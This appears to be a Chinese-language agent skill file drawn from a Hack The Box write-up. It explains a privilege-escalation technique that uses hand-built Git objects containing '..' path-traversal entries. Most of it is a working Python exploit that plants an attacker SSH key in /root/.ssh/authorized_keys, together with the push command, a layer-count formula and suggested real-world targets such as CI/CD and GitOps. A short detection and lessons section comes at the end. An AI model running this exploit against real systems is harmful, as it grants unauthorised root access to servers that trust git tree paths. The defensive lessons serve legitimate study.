---
name: 'git-object-path-traversal'
description: '手工构造 Git 对象含 .. 路径穿越 → 绕过 git 前端校验 → 配合 os.path.join 写任意文件的通用提权技术。来源 Nexus HTB。'
disable-model-invocation: true
metadata: { domain: linux, tier: T3 }
---

# Git 对象手工注入路径穿越

> 🔴 **通用技术。不限于 HTB — 任何"程序从 git repo 读文件路径 → 文件写入"的场景都可复用。**

## 核心原理

```text
攻击者可控的 Git repo
    → git ls-tree -r HEAD 输出文件路径
    → 目标程序用 os.path.join(base, filepath) 拼接
    → 如果 filepath 含 .. → 路径穿越 → 写任意文件
```text

**为什么 Git 前端会拒绝但对象层不拒绝：**
- `git add` / `git commit` 会校验路径，拒绝 `..` 和 `/` 前缀
- 但直接从 `.git/objects/` 写 raw 对象 → `git push` 会原样上传
- Gitea/Forgejo 等服务器端也**不做路径校验**（只校验 git 格式合法性）

## 手工构造 Git 对象

```python
import hashlib, zlib, os, time

def write_obj(data, obj_type):
    """写入 Git 对象到 .git/objects/"""
    header = f"{obj_type} {len(data)}".encode() + b"\x00"
    sha = hashlib.sha1(header + data).hexdigest()
    d = os.path.join(".git", "objects", sha[:2])
    os.makedirs(d, exist_ok=True)
    p = os.path.join(d, sha[2:])
    if not os.path.exists(p):
        open(p, "wb").write(zlib.compress(header + data))
    return sha

def entry(mode, name, sha):
    """创建 tree entry: mode SP name NULL 20-byte-hash"""
    return f"{mode} {name}".encode() + b"\x00" + bytes.fromhex(sha)

# 1. 创建 blob（文件内容）
payload_key = open("/tmp/.k.pub").read().strip() + "\n"
blob_key = write_obj(payload_key.encode(), "blob")

# 2. 创建嵌套 tree（路径穿越链）
# 目标: 从 /home/git/template-staging/jones/repo/ 逃逸到 /root/.ssh/
# 需要 5 层 .. 才能到根: ../../../../../root/.ssh/authorized_keys
# 但通过嵌套 tree, git ls-tree -r 会输出: ../../../../../root/.ssh/authorized_keys

tree_ssh = write_obj(entry("100644", "authorized_keys", blob_key), "tree")
tree_root = write_obj(entry("40000", ".ssh", tree_ssh), "tree")
chain = write_obj(entry("40000", "root", tree_root), "tree")

# 嵌套 N 层 ..（每层都是一个 tree，其中只有一个 .. entry 指向下一层）
for i in range(4):  # 4层 + 根tree中的1层 = 5层
    chain = write_obj(entry("40000", "..", chain), "tree")

# 3. 创建根 tree（README.md + 穿越链）
readme = write_obj(b"# Template\n", "blob")
root_tree = write_obj(
    entry("100644", "README.md", readme) +
    entry("40000", "..", chain),
    "tree"
)

# 4. 创建 commit 和 ref
ts = int(time.time())
commit = write_obj(
    f"tree {root_tree}\nauthor x <x@x> {ts} +0000\ncommitter x <x@x> {ts} +0000\n\ninit\n".encode(),
    "commit"
)
os.makedirs(".git/refs/heads", exist_ok=True)
open(".git/refs/heads/main", "w").write(commit + "\n")

# 5. Push
# git push http://user:pass@git.target/repo.git main --force
```text

## 层数计算公式

```text
layers_needed = depth_of_target_from_base + 1
# 例: base=/home/git/template-staging/jones/repo/
#     target=/root/.ssh/
#     depth = 5 (home, git, template-staging, jones, repo)
#     layers_needed = 5
#     根tree中: 1个 .. entry + 4层嵌套 = 5
```text

## 适用条件

| 条件 | 说明 |
|------|------|
| 目标程序从 git repo 读取文件路径 | 通过 `git ls-tree` 或 API |
| 读取的路径直接用于文件操作 | `open()`, `os.path.join()`, `shutil.copy()` 等 |
| 攻击者可控制 repo 内容 | 通过 push 或 PR |
| 目标以高权限运行 | root / system 才值得利用 |

## 典型场景

| 场景 | 触发机制 |
|------|---------|
| **CI/CD 管线** | repo 推送到 → CI 用 git ls-tree 构建部署路径 → 写文件 |
| **模板同步** (Nexus) | root cron → git ls-tree → os.path.join → 写 staging |
| **备份脚本** | 从 repo 拉取 → 按路径恢复文件 |
| **GitOps 部署** | repo manifest → 按路径部署到服务器 |

## 检测方法

```bash
# 检查 git tree 中是否有异常路径
git fsck --full
git ls-tree -r HEAD | grep -E '\.\.|^/'

# 审计系统中处理 git tree 的脚本
grep -r "ls-tree" /opt/ /etc/ /home/ 2>/dev/null
grep -r "os.path.join" /opt/ /etc/ 2>/dev/null | grep -i "git\|repo"
```text

## 教训

1. **git ls-tree 输出不可信** — tree entry 名可以是任意字符串
2. **os.path.join 不是安全的路径拼接** — 如果第二个参数以 `/` 开头或含 `..`，会逃逸
3. **始终 `os.path.realpath()` 验证** — 在文件操作前规范化路径并检查是否在允许目录内
4. **Git 客户端校验 ≠ 服务端校验** — push 到 Gitea/GitLab 后，ls-tree 原样返回 tree entry 名
